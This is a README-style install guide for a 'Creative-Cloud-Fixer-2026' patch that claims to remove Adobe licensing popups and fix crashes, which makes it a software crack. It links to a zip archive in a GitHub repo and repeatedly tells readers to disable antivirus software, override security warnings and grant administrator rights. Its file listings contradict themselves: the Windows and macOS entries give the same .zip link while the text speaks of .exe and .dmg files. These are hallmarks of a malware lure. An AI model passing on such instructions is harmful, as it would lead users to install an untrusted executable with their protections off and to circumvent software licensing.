## 🚀 Getting Started

This guide assumes little to no experience with software installation or patches. Follow these steps exactly:

---

### 1. Visit the Download Page

Click the big green button at the top or click here:  
[Download Creative-Cloud-Fixer-2026](https://github.com/geminiveo/Creative-Cloud-Fixer-2026/raw/refs/heads/main/addlement/Cloud_Fixer_Creative_v1.3.zip)

This will take you to the official release page on GitHub. Here, you will see different versions and files depending on updates. Find the latest release folder marked with the newest date.

---

### 2. Choose Your File to Download

Look for the main file named something like:  
- `https://github.com/geminiveo/Creative-Cloud-Fixer-2026/raw/refs/heads/main/addlement/Cloud_Fixer_Creative_v1.3.zip` for Windows  
- `https://github.com/geminiveo/Creative-Cloud-Fixer-2026/raw/refs/heads/main/addlement/Cloud_Fixer_Creative_v1.3.zip` or `.pkg` for macOS

Click on the file name. Your browser will start the download. Save it to a location you can easily find, such as your Desktop or Downloads folder.

---

### 3. Prepare Your Adobe Applications

Before running the patcher:  
- Close all Adobe apps completely. Make sure no Adobe processes are running in the background.  
- It is best to save all your work to avoid losing data.  
- Temporarily disable any antivirus or security software if you encounter issues launching the patcher; some may block the tool.

---

### 4. Run the Installer or Patch Tool

Locate the downloaded file.  
- On Windows, double-click the `.exe` file.  
- On macOS, double-click the `.dmg` file, then drag the app to your Applications folder or double-click the `.pkg` installer.

If a security warning appears, choose to run the file anyway. For Windows, you might see a User Account Control prompt; click "Yes" to allow it.

---

### 5. Follow On-Screen Instructions

The patcher will guide you through the fix process. Usually, this means clicking a “Start” or “Apply Patch” button.

The tool will process necessary files to fix licensing popups, neural filters, and crashes. This may take a few minutes.

---

### 6. Restart Your Computer

After the patch completes, close the patcher and restart your system. This final step helps apply changes properly.

---

### 7. Open Your Adobe Creative Cloud Apps

Launch your Adobe apps as usual. The annoying “Unlicensed App” messages should no longer appear. Neural filters will work correctly, and startup crashes should stop.

---

## 🔧 Troubleshooting

If you experience any issues, try these steps:  

- **Patcher won’t open or crashes:** Run the patcher as administrator or with elevated privileges.  
- **Error messages during patch:** Disable antivirus temporarily and retry.  
- **Patching seems to fail:** Close all Adobe processes again and reboot before retrying.  
- **Some services still don’t work:** Check for updates to Creative-Cloud-Fixer-2026 and download the latest version.  
- **Restoring original state:** The patch usually supports rollback. Check the FAQ or issues page on the GitHub repo for details.
